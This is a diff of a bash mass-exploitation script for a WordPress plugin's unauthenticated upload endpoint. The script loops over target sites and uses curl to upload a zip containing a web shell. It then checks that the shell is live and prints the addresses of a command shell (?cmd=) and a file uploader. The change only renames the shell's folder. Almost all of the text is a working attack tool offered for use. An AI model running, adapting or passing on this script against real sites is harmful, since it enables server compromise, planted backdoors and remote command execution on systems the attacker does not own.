@@ -2,7 +2,7 @@
 # Author : Con7ext
 # Website: https://plantsec.blogspot.com/2019/06/wordpress-plugin-insert-or-embed.html
 # CXSECUR: https://cxsecurity.com/issue/WLB-2019060146
-# Just add parameter ?cmd={COMMAND} in /wp-content/uploads/articulate_uploads/anjinglu/index.php?cmd=ls
+# Just add parameter ?cmd={COMMAND} in /wp-content/uploads/articulate_uploads/taumemekga/index.php?cmd=ls
 green='\e[92m'
 blue='\e[34m'
 red='\e[31m'
@@ -13,16 +13,16 @@ do
   if [[ $ck =~ "rest_no_route" ]];
   then 
     printf "$green[+] $site -> Maybe Vuln\n"
-    mes=$(curl -s -F "name=anjinglu.zip" -F "chunk=2" -F "chunks=3" -F "file=@anjinglu.zip" --url "$site/index.php/wp-json/articulate/v1/upload-data")
+    mes=$(curl -s -F "name=taumemekga.zip" -F "chunk=2" -F "chunks=3" -F "file=@taumemekga.zip" --url "$site/index.php/wp-json/articulate/v1/upload-data")
     if [[ $mes =~ "Upload Complete!" ]];
     then
       printf "$green[+] Success Uploading Shell ...\n"
       printf "$blue[!] Checking Shell ...\n";
-      moe=$(curl -s --url "$site/wp-content/uploads/articulate_uploads/anjinglu/index.html")
+      moe=$(curl -s --url "$site/wp-content/uploads/articulate_uploads/taumemekga/index.html")
       if [[ $moe =~ "plantsec" ]];
       then
-        printf "$green[+] Shell Found ... $site/wp-content/uploads/articulate_uploads/anjinglu/index.php\n"
-        printf "$green[+] Uploader ... $site/wp-content/uploads/articulate_uploads/anjinglu/upl.php\n\n"
+        printf "$green[+] Shell Found ... $site/wp-content/uploads/articulate_uploads/taumemekga/index.php\n"
+        printf "$green[+] Uploader ... $site/wp-content/uploads/articulate_uploads/taumemekga/upl.php\n\n"
       else
         printf "$red[-] Shell Not Found ...\n\n"
       fi
